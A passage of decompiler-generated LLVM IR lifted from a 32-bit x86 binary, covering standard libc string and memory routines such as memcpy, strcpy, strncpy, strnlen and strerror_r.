  %v1_805d3ca = icmp eq i32 %v6_805d3c2, 0
  %v1_805d3cc = icmp eq i1 %v1_805d3ca, false
  br i1 %v1_805d3cc, label %dec_label_pc_805d40e, label %dec_label_pc_805d3ce

dec_label_pc_805d3ce:                             ; preds = %dec_label_pc_805d3ba, %entry
  %v2_805d3ce = icmp eq i32 %v4_805d3a3, 0
  br i1 %v2_805d3ce, label %dec_label_pc_805d40e, label %dec_label_pc_805d3d2

dec_label_pc_805d3d2:                             ; preds = %dec_label_pc_805d3ce
  %v1_805d3d2 = icmp eq i32 %arg3, 0
  br i1 %v1_805d3d2, label %dec_label_pc_805d40e, label %dec_label_pc_805d3d6

dec_label_pc_805d3d6:                             ; preds = %dec_label_pc_805d3d2
  %v9_805d3db = udiv i64 4294967295, %arg2
  %v10_805d3db = trunc i64 %v9_805d3db to i32
  %v6_805d3df = icmp ult i32 %v10_805d3db, %arg3
  br i1 %v6_805d3df, label %dec_label_pc_805d3fb, label %dec_label_pc_805d3e1

dec_label_pc_805d3e1:                             ; preds = %dec_label_pc_805d3d6
  %sext = mul i64 %arg2, 4294967296
  %v2_805d3e4 = sdiv i64 %sext, 4294967296
  %v3_805d3e4 = sext i32 %arg3 to i64
  %v4_805d3e4 = mul nsw i64 %v3_805d3e4, %v2_805d3e4
  %v5_805d3e4 = trunc i64 %v4_805d3e4 to i32
  %v0_805d3e7 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805d3ed = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_805d3e4, i32 %v0_805d3e7, i32 %v10_805d3db)
  %v6_805d3ed = sext i32 %v5_805d3ed to i64
  %v10_805d3f7 = udiv i64 %v6_805d3ed, %arg2
  %v11_805d3f7 = trunc i64 %v10_805d3f7 to i32
  br label %dec_label_pc_805d410

dec_label_pc_805d3fb:                             ; preds = %dec_label_pc_805d3d6
  %v0_805d3fb = load i32, i32* @ebx, align 4
  %v1_805d3fb = inttoptr i32 %v0_805d3fb to i32*
  %v2_805d3fb = load i32, i32* %v1_805d3fb, align 4
  %v1_805d3fd = or i32 %v2_805d3fb, 8
  %v1_805d400 = trunc i32 %v1_805d3fd to i16
  %v3_805d400 = inttoptr i32 %v0_805d3fb to i16*
  store i16 %v1_805d400, i16* %v3_805d400, align 2
  %v0_805d403 = load i32, i32* %stack_var_-28, align 4
  %v1_805d403 = call i32 @__errno_location(i32 %v0_805d403)
  %v1_805d408 = inttoptr i32 %v1_805d403 to i32*
  store i32 22, i32* %v1_805d408, align 4
  br label %dec_label_pc_805d40e

dec_label_pc_805d40e:                             ; preds = %dec_label_pc_805d3d2, %dec_label_pc_805d3ce, %dec_label_pc_805d3ba, %dec_label_pc_805d3fb
  br label %dec_label_pc_805d410

dec_label_pc_805d410:                             ; preds = %dec_label_pc_805d3e1, %dec_label_pc_805d40e
  %v0_805d413 = phi i32 [ %v11_805d3f7, %dec_label_pc_805d3e1 ], [ 0, %dec_label_pc_805d40e ]
  store i32 %v0_805d39d, i32* @esi, align 4
  store i32 %v0_805d39c, i32* @edi, align 4
  ret i32 %v0_805d413

; uselistorder directives
  uselistorder i32 %v0_805d3ba, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 0, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805d410, { 1, 0 }
  uselistorder label %dec_label_pc_805d40e, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805d415 = load i32, i32* @esi, align 4
  store i32 %v0_805d415, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805d416 = sdiv i32 %sext, 16777216
  store i32 %v4_805d416, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805d41e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805d41e, i32* %edi.global-to-local, align 4
  %v2_805d424 = udiv i32 %v4_805d416, 4
  %v3_805d427 = inttoptr i32 %arg2 to i8*
  %v4_805d427 = bitcast i16* %arg1 to i8*
  %v5_805d427 = call i8* @_memcpy(i8* %v4_805d427, i8* %v3_805d427, i32 %v2_805d424)
  %v6_805d427 = ptrtoint i8* %v5_805d427 to i32
  store i32 %v6_805d427, i32* @ecx, align 4
  %v0_805d429 = load i32, i32* %eax.global-to-local, align 4
  %v2_805d429 = and i32 %v0_805d429, 2
  %v3_805d429 = icmp eq i32 %v2_805d429, 0
  br i1 %v3_805d429, label %dec_label_pc_805d42f, label %dec_label_pc_805d42d

dec_label_pc_805d42d:                             ; preds = %entry
  %v0_805d42d = load i32, i32* %esi.global-to-local, align 4
  %v1_805d42d = inttoptr i32 %v0_805d42d to i16*
  %v2_805d42d = load i16, i16* %v1_805d42d, align 2
  %v3_805d42d = load i32, i32* %edi.global-to-local, align 4
  %v4_805d42d = inttoptr i32 %v3_805d42d to i16*
  store i16 %v2_805d42d, i16* %v4_805d42d, align 2
  %v5_805d42d = load i32, i32* %edi.global-to-local, align 4
  %v6_805d42d = load i32, i32* %esi.global-to-local, align 4
  %v7_805d42d = load i1, i1* @df, align 1
  %v8_805d42d = select i1 %v7_805d42d, i32 -2, i32 2
  %v9_805d42d = add i32 %v8_805d42d, %v5_805d42d
  %v10_805d42d = add i32 %v8_805d42d, %v6_805d42d
  store i32 %v9_805d42d, i32* %edi.global-to-local, align 4
  store i32 %v10_805d42d, i32* %esi.global-to-local, align 4
  %v0_805d42f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d42f

dec_label_pc_805d42f:                             ; preds = %entry, %dec_label_pc_805d42d
  %v0_805d42f = phi i32 [ %v0_805d429, %entry ], [ %v0_805d42f.pre, %dec_label_pc_805d42d ]
  %v2_805d42f = urem i32 %v0_805d42f, 2
  %v3_805d42f = icmp eq i32 %v2_805d42f, 0
  br i1 %v3_805d42f, label %dec_label_pc_805d434, label %dec_label_pc_805d433

dec_label_pc_805d433:                             ; preds = %dec_label_pc_805d42f
  %v0_805d433 = load i32, i32* %esi.global-to-local, align 4
  %v1_805d433 = inttoptr i32 %v0_805d433 to i8*
  %v2_805d433 = load i8, i8* %v1_805d433, align 1
  %v3_805d433 = load i32, i32* %edi.global-to-local, align 4
  %v4_805d433 = inttoptr i32 %v3_805d433 to i8*
  store i8 %v2_805d433, i8* %v4_805d433, align 1
  %v5_805d433 = load i32, i32* %edi.global-to-local, align 4
  %v6_805d433 = load i32, i32* %esi.global-to-local, align 4
  %v7_805d433 = load i1, i1* @df, align 1
  %v8_805d433 = select i1 %v7_805d433, i32 -1, i32 1
  %v9_805d433 = add i32 %v8_805d433, %v5_805d433
  %v10_805d433 = add i32 %v8_805d433, %v6_805d433
  store i32 %v9_805d433, i32* %edi.global-to-local, align 4
  store i32 %v10_805d433, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805d434

dec_label_pc_805d434:                             ; preds = %dec_label_pc_805d42f, %dec_label_pc_805d433
  store i32 %v4_805d41e, i32* %eax.global-to-local, align 4
  %v2_805d438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d438, i32* @esi, align 4
  ret i32 %v4_805d41e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_805d434, { 1, 0 }
  uselistorder label %dec_label_pc_805d42f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805d43c = load i32, i32* @edi, align 4
  %v4_805d445 = ptrtoint i8* %arg1 to i32
  %v5_805d449 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_805d449 = ptrtoint i8* %v5_805d449 to i32
  store i32 %v6_805d449, i32* @ecx, align 4
  store i32 %v0_805d43c, i32* @edi, align 4
  ret i32 %v4_805d445

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805d455 = ptrtoint i8* %arg1 to i32
  %v2_805d45d = mul i32 %arg2, 256
  %v3_805d45d = and i32 %v2_805d45d, 65280
  %v4_805d45d = and i32 %arg2, -65281
  %v5_805d45d = or i32 %v3_805d45d, %v4_805d45d
  %v8_805d45f.pre = load i1, i1* @df, align 1
  %v9_805d45f = select i1 %v8_805d45f.pre, i32 -1, i32 1
  br label %dec_label_pc_805d45f

dec_label_pc_805d45f:                             ; preds = %dec_label_pc_805d464, %entry
  %v4_805d45f = phi i32 [ %v6_805d45f, %dec_label_pc_805d464 ], [ %v5_805d45d, %entry ]
  %v7_805d45f = phi i32 [ %v10_805d45f, %dec_label_pc_805d464 ], [ %v4_805d455, %entry ]
  %v1_805d45f = inttoptr i32 %v7_805d45f to i8*
  %v2_805d45f = load i8, i8* %v1_805d45f, align 1
  %v10_805d45f = add i32 %v7_805d45f, %v9_805d45f
  %v3_805d460 = udiv i32 %v4_805d45f, 256
  %v4_805d460 = trunc i32 %v3_805d460 to i8
  %v16_805d460 = icmp eq i8 %v2_805d45f, %v4_805d460
  br i1 %v16_805d460, label %dec_label_pc_805d46d.loopexit, label %dec_label_pc_805d464

dec_label_pc_805d464:                             ; preds = %dec_label_pc_805d45f
  %v3_805d45f = zext i8 %v2_805d45f to i32
  %v5_805d45f = and i32 %v4_805d45f, -256
  %v6_805d45f = or i32 %v3_805d45f, %v5_805d45f
  %v4_805d464 = icmp eq i8 %v2_805d45f, 0
  %v1_805d466 = icmp eq i1 %v4_805d464, false
  br i1 %v1_805d466, label %dec_label_pc_805d45f, label %dec_label_pc_805d468

dec_label_pc_805d468:                             ; preds = %dec_label_pc_805d464
  br label %dec_label_pc_805d46d

dec_label_pc_805d46d.loopexit:                    ; preds = %dec_label_pc_805d45f
  %phitmp = add i32 %v10_805d45f, -1
  br label %dec_label_pc_805d46d

dec_label_pc_805d46d:                             ; preds = %dec_label_pc_805d46d.loopexit, %dec_label_pc_805d468
  %v0_805d46d = phi i32 [ 0, %dec_label_pc_805d468 ], [ %phitmp, %dec_label_pc_805d46d.loopexit ]
  ret i32 %v0_805d46d

; uselistorder directives
  uselistorder i8 %v2_805d45f, { 1, 2, 0 }
  uselistorder i32 %v4_805d45f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805d476 = ptrtoint i8* %arg1 to i32
  %v4_805d47e.pre = load i32, i32* @eax, align 4
  %v8_805d47e.pre = load i1, i1* @df, align 1
  %v9_805d47e = select i1 %v8_805d47e.pre, i32 -1, i32 1
  br label %dec_label_pc_805d47e

dec_label_pc_805d47e:                             ; preds = %dec_label_pc_805d482, %entry
  %v20_805d47f = phi i32 [ %v23_805d47f, %dec_label_pc_805d482 ], [ %arg2, %entry ]
  %v4_805d47e = phi i32 [ %v6_805d47e, %dec_label_pc_805d482 ], [ %v4_805d47e.pre, %entry ]
  %v7_805d47e = phi i32 [ %v10_805d47e, %dec_label_pc_805d482 ], [ %v4_805d476, %entry ]
  %v1_805d47e = inttoptr i32 %v7_805d47e to i8*
  %v2_805d47e = load i8, i8* %v1_805d47e, align 1
  %v3_805d47f = inttoptr i32 %v20_805d47f to i8*
  %v4_805d47f = load i8, i8* %v3_805d47f, align 1
  %v15_805d47f = icmp eq i8 %v2_805d47e, %v4_805d47f
  %v1_805d480 = icmp eq i1 %v15_805d47f, false
  br i1 %v1_805d480, label %dec_label_pc_805d48a, label %dec_label_pc_805d482

dec_label_pc_805d482:                             ; preds = %dec_label_pc_805d47e
  %v23_805d47f = add i32 %v20_805d47f, %v9_805d47e
  %v10_805d47e = add i32 %v7_805d47e, %v9_805d47e
  %v3_805d47e = zext i8 %v2_805d47e to i32
  %v5_805d47e = and i32 %v4_805d47e, -256
  %v6_805d47e = or i32 %v3_805d47e, %v5_805d47e
  %v4_805d482 = icmp eq i8 %v2_805d47e, 0
  %v1_805d484 = icmp eq i1 %v4_805d482, false
  br i1 %v1_805d484, label %dec_label_pc_805d47e, label %dec_label_pc_805d48e

dec_label_pc_805d48a:                             ; preds = %dec_label_pc_805d47e
  br label %dec_label_pc_805d48e

dec_label_pc_805d48e:                             ; preds = %dec_label_pc_805d482, %dec_label_pc_805d48a
  %storemerge = phi i32 [ 1, %dec_label_pc_805d48a ], [ 0, %dec_label_pc_805d482 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805d47e, { 1, 2, 0 }
  uselistorder i32 %v9_805d47e, { 1, 0 }
  uselistorder label %dec_label_pc_805d48e, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805d495 = load i32, i32* @esi, align 4
  store i32 %v0_805d495, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805d49d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d49d, i32* %edi.global-to-local, align 4
  %v4_805d4a1.pre = load i32, i32* @eax, align 4
  %v8_805d4a1.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805d4a1

dec_label_pc_805d4a1:                             ; preds = %dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge, %entry
  %v2_805d4a2 = phi i32 [ %v7_805d4a2, %dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge ], [ %v4_805d49d, %entry ]
  %v8_805d4a1 = phi i1 [ %v5_805d4a2, %dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge ], [ %v8_805d4a1.pre, %entry ]
  %v4_805d4a1 = phi i32 [ %v0_805d4a3, %dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge ], [ %v4_805d4a1.pre, %entry ]
  %v7_805d4a1 = phi i32 [ %v0_805d4a1.pre, %dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge ], [ %arg2, %entry ]
  %v1_805d4a1 = inttoptr i32 %v7_805d4a1 to i8*
  %v2_805d4a1 = load i8, i8* %v1_805d4a1, align 1
  %v3_805d4a1 = zext i8 %v2_805d4a1 to i32
  %v5_805d4a1 = and i32 %v4_805d4a1, -256
  %v6_805d4a1 = or i32 %v3_805d4a1, %v5_805d4a1
  store i32 %v6_805d4a1, i32* %eax.global-to-local, align 4
  %v9_805d4a1 = select i1 %v8_805d4a1, i32 -1, i32 1
  %v10_805d4a1 = add i32 %v7_805d4a1, %v9_805d4a1
  store i32 %v10_805d4a1, i32* %esi.global-to-local, align 4
  %v3_805d4a2 = inttoptr i32 %v2_805d4a2 to i8*
  store i8 %v2_805d4a1, i8* %v3_805d4a2, align 1
  %v4_805d4a2 = load i32, i32* %edi.global-to-local, align 4
  %v5_805d4a2 = load i1, i1* @df, align 1
  %v6_805d4a2 = select i1 %v5_805d4a2, i32 -1, i32 1
  %v7_805d4a2 = add i32 %v6_805d4a2, %v4_805d4a2
  store i32 %v7_805d4a2, i32* %edi.global-to-local, align 4
  %v0_805d4a3 = load i32, i32* %eax.global-to-local, align 4
  %v3_805d4a3 = trunc i32 %v0_805d4a3 to i8
  %v4_805d4a3 = icmp eq i8 %v3_805d4a3, 0
  %v1_805d4a5 = icmp eq i1 %v4_805d4a3, false
  br i1 %v1_805d4a5, label %dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge, label %dec_label_pc_805d4a7

dec_label_pc_805d4a1.dec_label_pc_805d4a1_crit_edge: ; preds = %dec_label_pc_805d4a1
  %v0_805d4a1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805d4a1

dec_label_pc_805d4a7:                             ; preds = %dec_label_pc_805d4a1
  store i32 %v4_805d49d, i32* %eax.global-to-local, align 4
  %v2_805d4ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d4ac, i32* @esi, align 4
  ret i32 %v4_805d49d

; uselistorder directives
  uselistorder i32 %v0_805d4a3, { 1, 0 }
  uselistorder i32 %v7_805d4a2, { 1, 0 }
  uselistorder i1 %v5_805d4a2, { 1, 0 }
  uselistorder i32 %v4_805d49d, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805d4ed = load i32, i32* @esi, align 4
  store i32 %v0_805d4ed, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805d4f9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d4f9, i32* %edi.global-to-local, align 4
  %v1_805d4fd = add i32 %arg3, 1
  br label %dec_label_pc_805d4fe

dec_label_pc_805d4fe:                             ; preds = %dec_label_pc_805d501, %entry
  %v3_805d502 = phi i32 [ %v4_805d4f9, %entry ], [ %v8_805d502, %dec_label_pc_805d501 ]
  %v0_805d4fe = phi i32 [ %v1_805d4fd, %entry ], [ %v0_805d4fe.pre, %dec_label_pc_805d501 ]
  %v1_805d4fe = add i32 %v0_805d4fe, -1
  %v8_805d4fe = icmp eq i32 %v1_805d4fe, 0
  store i32 %v1_805d4fe, i32* @ecx, align 4
  br i1 %v8_805d4fe, label %.loopexit, label %dec_label_pc_805d501

dec_label_pc_805d501:                             ; preds = %dec_label_pc_805d4fe
  %v0_805d501 = load i32, i32* %esi.global-to-local, align 4
  %v1_805d501 = inttoptr i32 %v0_805d501 to i8*
  %v2_805d501 = load i8, i8* %v1_805d501, align 1
  %v10_805d501 = load i1, i1* @df, align 1
  %v11_805d501 = select i1 %v10_805d501, i32 -1, i32 1
  %v12_805d501 = add i32 %v11_805d501, %v0_805d501
  store i32 %v12_805d501, i32* %esi.global-to-local, align 4
  %v4_805d502 = inttoptr i32 %v3_805d502 to i8*
  store i8 %v2_805d501, i8* %v4_805d502, align 1
  %v5_805d502 = load i32, i32* %edi.global-to-local, align 4
  %v6_805d502 = load i1, i1* @df, align 1
  %v7_805d502 = select i1 %v6_805d502, i32 -1, i32 1
  %v8_805d502 = add i32 %v7_805d502, %v5_805d502
  store i32 %v8_805d502, i32* %edi.global-to-local, align 4
  %v6_805d503 = icmp eq i8 %v2_805d501, 0
  %v1_805d505 = icmp eq i1 %v6_805d503, false
  %v0_805d4fe.pre = load i32, i32* @ecx, align 4
  br i1 %v1_805d505, label %dec_label_pc_805d4fe, label %dec_label_pc_805d507

dec_label_pc_805d507:                             ; preds = %dec_label_pc_805d501
  %v1_805d507 = add i32 %v0_805d4fe.pre, -1
  %v2_805d508 = sext i8 %v2_805d501 to i32
  %v4_805d508 = inttoptr i32 %v8_805d502 to i8*
  %v5_805d508 = call i8* @_memset(i8* %v4_805d508, i32 %v2_805d508, i32 %v1_805d507)
  %v6_805d508 = ptrtoint i8* %v5_805d508 to i32
  store i32 %v6_805d508, i32* @ecx, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_805d4fe, %dec_label_pc_805d507
  %v2_805d50e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805d50e, i32* @edx, align 4
  %v2_805d50f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d50f, i32* @esi, align 4
  ret i32 %v4_805d4f9

; uselistorder directives
  uselistorder i32 %v8_805d502, { 0, 2, 1 }
  uselistorder i8 %v2_805d501, { 0, 2, 1 }
  uselistorder i32 %v1_805d4fe, { 1, 0 }
  uselistorder i32 %v4_805d4f9, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_805d514 = ptrtoint i8* %tmp4 to i32
  %v8_805d5275 = icmp eq i32 %tmp, 0
  %v1_805d5287 = icmp eq i1 %v8_805d5275, false
  br i1 %v1_805d5287, label %dec_label_pc_805d521, label %dec_label_pc_805d52a

dec_label_pc_805d521:                             ; preds = %entry, %dec_label_pc_805d526
  %v1_805d5279 = phi i32 [ %v1_805d527, %dec_label_pc_805d526 ], [ %tmp, %entry ]
  %v0_805d52a8 = phi i32 [ %v1_805d526, %dec_label_pc_805d526 ], [ %v4_805d514, %entry ]
  %v1_805d521 = inttoptr i32 %v0_805d52a8 to i8*
  %v2_805d521 = load i8, i8* %v1_805d521, align 1
  %v3_805d521 = icmp eq i8 %v2_805d521, 0
  br i1 %v3_805d521, label %dec_label_pc_805d52a, label %dec_label_pc_805d526

dec_label_pc_805d526:                             ; preds = %dec_label_pc_805d521
  %v1_805d526 = add i32 %v0_805d52a8, 1
  %v1_805d527 = add i32 %v1_805d5279, -1
  %v8_805d527 = icmp eq i32 %v1_805d527, 0
  %v1_805d528 = icmp eq i1 %v8_805d527, false
  br i1 %v1_805d528, label %dec_label_pc_805d521, label %dec_label_pc_805d52a

dec_label_pc_805d52a:                             ; preds = %dec_label_pc_805d526, %dec_label_pc_805d521, %entry
  %v0_805d52a.lcssa = phi i32 [ %v4_805d514, %entry ], [ %v0_805d52a8, %dec_label_pc_805d521 ], [ %v1_805d526, %dec_label_pc_805d526 ]
  %v2_805d52a = sub i32 %v0_805d52a.lcssa, %v4_805d514
  ret i32 %v2_805d52a

; uselistorder directives
  uselistorder i32 %v1_805d527, { 1, 0 }
  uselistorder i32 %v0_805d52a8, { 0, 2, 1 }
  uselistorder i32 %v4_805d514, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d521, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @ebx, align 4
  %v3_805d611 = call i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3)
  %v0_805d619 = load i32, i32* @ebx, align 4
  ret i32 %v0_805d619
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805d632 = icmp ugt i32 %arg1, 124
  br i1 %v6_805d632, label %dec_label_pc_805d64f, label %dec_label_pc_805d634

dec_label_pc_805d634:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_806dac0.705 to i32), i32* @esi, align 4
  %v1_805d6444 = icmp eq i32 %arg1, 0
  %v1_805d64611 = icmp eq i1 %v1_805d6444, false
  br i1 %v1_805d64611, label %dec_label_pc_805d63d, label %dec_label_pc_805d648

dec_label_pc_805d63d:                             ; preds = %dec_label_pc_805d634, %dec_label_pc_805d63d
  %v0_805d640 = phi i32 [ %v3_805d640, %dec_label_pc_805d63d ], [ %arg1, %dec_label_pc_805d634 ]
  %v0_805d643 = phi i32 [ %v1_805d643, %dec_label_pc_805d63d ], [ ptrtoint ([8 x i8]* @global_var_806dac0.705 to i32), %dec_label_pc_805d634 ]
  %v1_805d63d = inttoptr i32 %v0_805d643 to i8*
  %v2_805d63d = load i8, i8* %v1_805d63d, align 1
  %v7_805d63d = icmp eq i8 %v2_805d63d, 0
  %v2_805d640 = zext i1 %v7_805d63d to i32
  %v3_805d640 = add i32 %v2_805d640, %v0_805d640
  %v16_805d640 = icmp eq i32 %v3_805d640, 0
  %v1_805d643 = add i32 %v0_805d643, 1
  store i32 %v1_805d643, i32* @esi, align 4
  %v1_805d646 = icmp eq i1 %v16_805d640, false
  br i1 %v1_805d646, label %dec_label_pc_805d63d, label %dec_label_pc_805d648

dec_label_pc_805d648:                             ; preds = %dec_label_pc_805d63d, %dec_label_pc_805d634
  %v0_805d64a = phi i32 [ ptrtoint ([8 x i8]* @global_var_806dac0.705 to i32), %dec_label_pc_805d634 ], [ %v1_805d643, %dec_label_pc_805d63d ]
  store i32 0, i32* @ebp, align 4
  %v1_805d64a = inttoptr i32 %v0_805d64a to i8*
  %v2_805d64a = load i8, i8* %v1_805d64a, align 1
  %v3_805d64a = icmp eq i8 %v2_805d64a, 0
  %v1_805d64d = icmp eq i1 %v3_805d64a, false
  br i1 %v1_805d64d, label %dec_label_pc_805d648.dec_label_pc_805d67e_crit_edge, label %dec_label_pc_805d64f

dec_label_pc_805d648.dec_label_pc_805d67e_crit_edge: ; preds = %dec_label_pc_805d648
  br label %dec_label_pc_805d67e

dec_label_pc_805d64f:                             ; preds = %dec_label_pc_805d648, %entry
  %v1_805d652 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_805d663 = bitcast i32* %stack_var_-17 to i8*
  %v7_805d663 = call i32 @_uintmaxtostr(i8* %v6_805d663, i32 %arg1, i32 %v1_805d652, i32 -10, i32 0)
  %v1_805d672 = add i32 %v7_805d663, -14
  store i32 %v1_805d672, i32* @esi, align 4
  %v5_805d675 = inttoptr i32 %v1_805d672 to i8*
  store i8* %v5_805d675, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805d672 to i16*
  %v6_805d676 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_806daaa.706 to i32), i32 14)
  %v1_805d688.pre = load i32, i32* @edi, align 4
  %v0_805d68e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d67e

dec_label_pc_805d67e:                             ; preds = %dec_label_pc_805d648.dec_label_pc_805d67e_crit_edge, %dec_label_pc_805d64f
  %v0_805d68e = phi i32 [ %v0_805d64a, %dec_label_pc_805d648.dec_label_pc_805d67e_crit_edge ], [ %v0_805d68e.pre, %dec_label_pc_805d64f ]
  %v1_805d688 = phi i32 [ %arg3, %dec_label_pc_805d648.dec_label_pc_805d67e_crit_edge ], [ %v1_805d688.pre, %dec_label_pc_805d64f ]
  %v4_805d67e = icmp eq i32 %arg2, 0
  %v3_805d688 = select i1 %v4_805d67e, i32 0, i32 %v1_805d688
  store i32 %v3_805d688, i32* @edi, align 4
  %v5_805d68e = inttoptr i32 %v0_805d68e to i8*
  store i8* %v5_805d68e, i8** %stack_var_-108, align 4
  %v3_805d68f = call i32 @strlen(i8* %v5_805d68e)
  %v1_805d697 = add i32 %v3_805d68f, 1
  store i32 %v1_805d697, i32* %ebx.global-to-local, align 4
  %v1_805d69a = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_805d697, %v1_805d69a
  br i1 %tmp, label %dec_label_pc_805d69e, label %dec_label_pc_805d6a5

dec_label_pc_805d69e:                             ; preds = %dec_label_pc_805d67e
  store i32 %v1_805d69a, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_805d6a5

dec_label_pc_805d6a5:                             ; preds = %dec_label_pc_805d67e, %dec_label_pc_805d69e
  %v0_805d6aa = phi i32 [ %v1_805d697, %dec_label_pc_805d67e ], [ %v1_805d69a, %dec_label_pc_805d69e ]
  %v1_805d6a5 = icmp eq i32 %v0_805d6aa, 0
  br i1 %v1_805d6a5, label %dec_label_pc_805d6c1, label %dec_label_pc_805d6a9

dec_label_pc_805d6a9:                             ; preds = %dec_label_pc_805d6a5
  %v0_805d6ab = load i32, i32* @esi, align 4
  %v8_805d6ac = inttoptr i32 %arg2 to i8*
  store i8* %v8_805d6ac, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_805d6b0 = call i32 @memcpy(i16* %tmp45, i32 %v0_805d6ab, i32 %v0_805d6aa)
  %v1_805d6bc = load i32, i32* %ebx.global-to-local, align 4
  %v2_805d6bc = add i32 %arg2, -1
  %v3_805d6bc = add i32 %v2_805d6bc, %v1_805d6bc
  %v4_805d6bc = inttoptr i32 %v3_805d6bc to i8*
  store i8 0, i8* %v4_805d6bc, align 1
  br label %dec_label_pc_805d6c1

dec_label_pc_805d6c1:                             ; preds = %dec_label_pc_805d6a5, %dec_label_pc_805d6a9
  %v0_805d6c1 = load i32, i32* @ebp, align 4
  %v1_805d6c1 = icmp eq i32 %v0_805d6c1, 0
  br i1 %v1_805d6c1, label %dec_label_pc_805d6cc, label %dec_label_pc_805d6c5

dec_label_pc_805d6c5:                             ; preds = %dec_label_pc_805d6c1
  %v0_805d6c5 = load i8*, i8** %stack_var_-108, align 4
  %v1_805d6c5 = ptrtoint i8* %v0_805d6c5 to i32
  %v2_805d6c5 = call i32 @__errno_location(i32 %v1_805d6c5)
  %v0_805d6ca = load i32, i32* @ebp, align 4
  %v2_805d6ca = inttoptr i32 %v2_805d6c5 to i32*
  store i32 %v0_805d6ca, i32* %v2_805d6ca, align 4
  %v0_805d6cf.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805d6cc

dec_label_pc_805d6cc:                             ; preds = %dec_label_pc_805d6c1, %dec_label_pc_805d6c5
  %v0_805d6cf = phi i32 [ 0, %dec_label_pc_805d6c1 ], [ %v0_805d6cf.pre, %dec_label_pc_805d6c5 ]
